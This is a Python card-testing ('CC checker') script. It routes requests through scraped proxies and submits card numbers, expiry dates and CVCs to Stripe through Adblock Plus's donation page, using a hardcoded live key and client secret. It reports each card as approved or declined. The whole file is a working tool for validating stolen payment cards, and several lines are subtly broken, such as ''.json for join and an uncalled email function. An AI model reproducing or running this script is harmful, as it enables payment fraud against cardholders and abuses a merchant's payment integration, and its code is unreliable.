#!/usr/bin/python -tt
import requests
import json
import random
import string
import re
from bs4 import BeautifulSoup as bs


#random mail gen 
def email():
    return ''.json(random.choice(string.ascii_lowercase) for x in range(random.randint(7, 15))) + str(random.randint(1111, 9999)) + '@gmail.com'


# Lista Break
def pregs(list):
    arrays = re.findall(r'[0-9]+', list)
    return arrays
#proxy 


r = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all').text
res = r.partition('\n')[-1]
proxy = {"http": f"http://{res}"}
session = requests.session()

session.proxies = proxy



# main Fun

list = '0000000000000000|00|00|000'

def main(list):



	# break cc

	arrs = pregs(list)
	cc = arrs[0]
	month = arrs[1]
	year = arrs[2]
	cvc = arrs[3]
	session = requests.session()


	# stripe 

	headers = {
	        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0",
	        "Accept": "application/json, text/plain, */*",
	        "Content-Type": "application/x-www-form-urlencoded"
	    }
	s = session.post("https://m.stripe.com/6",
	                      headers=headers)
	r = s.json()
	Guid = r["guid"]
	Muid = r["muid"]
	Sid = r["sid"]
	    
	    # now 1 req
	payload = {
	    	"lang": "en",
	    	"type": "donation",
	    	"currency": "USD",
	    	"amount": "5",
	    	"custom": "x-0-b43513cf-721e-4263-8d1d-527eb414ea29",
	    	"currencySign": "$"
	    }
	    
	head = {
	      "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
	      "Content-Type": "application/x-www-form-urlencoded",
	      "Accept": "*/*",
	      "Origin": "https://adblockplus.org",
	      "Sec-Fetch-Dest": "empty",
	      "Referer": "https://adblockplus.org/",
	      "Accept-Language": "en-US,en;q=0.9"
	    }
	    
	re = session.post("https://new-integration.adblockplus.org/",
	                     data=payload, headers=head)
	client = re.text
	pi = client[0:27]
	    
	    #hmm
	load = {
	      "receipt_email": email,
	      "payment_method_data[type]": "card",
	      "payment_method_data[billing_details][email]": email,
	      "payment_method_data[card][number]": cc,
	      "payment_method_data[card][cvc]": cvc,
	      "payment_method_data[card][exp_month]": month,
	      "payment_method_data[card][exp_year]": year,
	      "payment_method_data[guid]": Guid,
	      "payment_method_data[muid]": Muid,
	      "payment_method_data[sid]": Sid,
	      "payment_method_data[payment_user_agent]": "stripe.js/af38c6da9;+stripe-js-v3/af38c6da9",
	      "payment_method_data[referrer]": "https://adblockplus.org/",
	      "expected_payment_method_type": "card",
	      "use_stripe_sdk": "true",
	      "webauthn_uvpa_available": "true",
	      "spc_eligible": "false",
	      "key": "pk_live_Nlfxy49RuJeHqF1XOAtUPUXg00fH7wpfXs",
	      "client_secret": "pi_3LMs8jBoI27qQhxA1IfAgDCi_secret_ccB7OxPJWkVMkNO1gsGeummLi"
	    }
	    
	header = {
	      "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
	      "Content-Type": "application/x-www-form-urlencoded",
	      "Accept": "application/json",
		  
	      "Origin": "https://js.stripe.com",
	      "Referer": "https://js.stripe.com/",
	      "Accept-Language": "en-US,en;q=0.9"
	    }
	# req

	rx = session.post(f"https://api.stripe.com/v1/payment_intents/{pi}/confirm",
	                     data=load, headers=header)
	# print(rx)
	# print(re " Sys is OK")
	# print(s + " Stripe Is OK")

	if re.status_code == 200:
		print(' $ re Is OK')
	else:
		print(" $ ERROR " + str(re.status_code))


	if rx.status_code == 200:
		print(' $ rx Is OK')
	else:
		print(" $ ERROR in rx, Status : " + str(rx.status_code))

	if s.status_code == 200:
		print(' $ s Is OK')
	else:
		print(" ERROR " + str(s.status_code))


	res = rx.json()
	    # msg = res["error"]["message"]
	    # toc = time.perf_counter()
	if "incorrect_cvc" in rx.text:
	    	print('CC:'+list+' #ApprovedCCN')

	elif 'Unrecognized request URL' in rx.text:
	     	print('CC:'+list+' #[UPDATE] PROXIES ERROR')

	elif rx.status_code == 200:
			print('CC:'+list+' #ApprovedCVV')

	else:
			print('CC:'+list+' #Decliened')